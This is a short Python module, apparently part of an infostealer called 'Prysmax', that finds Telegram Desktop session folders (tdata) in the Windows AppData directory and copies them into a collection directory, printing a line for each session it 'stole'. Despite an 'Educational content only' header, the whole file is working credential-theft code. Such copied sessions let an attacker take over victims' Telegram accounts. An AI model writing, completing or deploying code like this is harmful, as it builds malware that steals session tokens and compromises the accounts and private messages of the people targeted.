#!/usr/bin/env python3
"""
Prysmax Telegram Stealer Module
Educational content only
"""

import os
import sys
import shutil

class TelegramStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.telegram_paths = {
            "Telegram Desktop": os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata"),
            "Telegram": os.path.expanduser("~\\AppData\\Roaming\\Telegram\\tdata")
        }
        
    def steal(self):
        """Steal Telegram session files"""
        try:
            telegram_dir = os.path.join(self.output_dir, "Telegram")
            os.makedirs(telegram_dir, exist_ok=True)
            
            for app_name, app_path in self.telegram_paths.items():
                if os.path.exists(app_path):
                    try:
                        app_output = os.path.join(telegram_dir, app_name.replace(" ", "_"))
                        shutil.copytree(app_path, app_output, dirs_exist_ok=True)
                        print(f"[TELEGRAM] Stolen {app_name} session")
                    except Exception as e:
                        print(f"[TELEGRAM] Error stealing {app_name}: {e}")
                        
        except Exception as e:
            print(f"[TELEGRAM] General error: {e}")

